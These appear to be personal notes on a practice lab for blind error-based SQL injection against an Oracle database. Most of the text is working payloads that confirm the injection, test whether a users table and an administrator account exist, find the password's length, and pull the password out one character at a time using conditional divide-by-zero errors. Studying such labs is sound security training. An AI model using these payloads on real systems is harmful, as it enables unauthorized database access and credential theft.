Blind sqli error based  

Prove that parameter is vulnerable
Single quote we get an error

Double quote the query return as expected

Adding concatenation character
```
Cookieid' || (select '') || '
```
Looks like this isnt a mysql but a oracle db

Adding dual since it might be oracle
```
Cookieid' || (select '' from dual) ||  '
```
No error so this is a oracle db and vulnerable to sequel injection

Output table that doesn't exist
```
' || (select '' from dualasfsf) || '
```
We get an error

Confirm that users table exist in database
```
' || (select '' from user) || '
```
Error since the '' sql entry will select more than one entry  or a empty entry which might break our query

Fix by adding rownum =1 
Which will make sure we only get 1 entry 
We donâ€™t get an error so user tables exist
```
'  || (select '' from users where rownum=1) || '
```

Confirm the administrator user exists in the users databases
Difficult to determine if this is a valid user or not so you can't tell if user exist in the database. It will not generate an error if there isnt a user in that table 
```
' || (select '' from users where username='administrator') || '
```

We have to use the case which is if else clauses
We should get a 200 response
```
' || (select CASE WHEN (1=0) THEN TO_CHAR (1/0) ELSE '' END from dual)  || '
```

We should get an error
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from dual)  || '
```

Order of execution the from clause is evaluated first before the select clause
Error will indicate the username exist
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator')  || '
```

Error response username exist

Trying with username that doesn't exist will get you a 200 response cause it won't run the to_char which will generate a 200 response 
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='viet')  || '
```

Determine length of password
Will error cause the password IS greater than 1 
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator' and length(password)>1)  || '
```

Will do a 200 response cause the password is not greater than 50
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' end from users where username='administrator' and length(password)>50)  || '
```

Put on intruder and payload number
Exactly 20 characters since that when it stopped and gave us an error

Output password 
Use cluster bombs
```
' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) = 'a')  || '
```
Error status 500 will be our password 
We got password
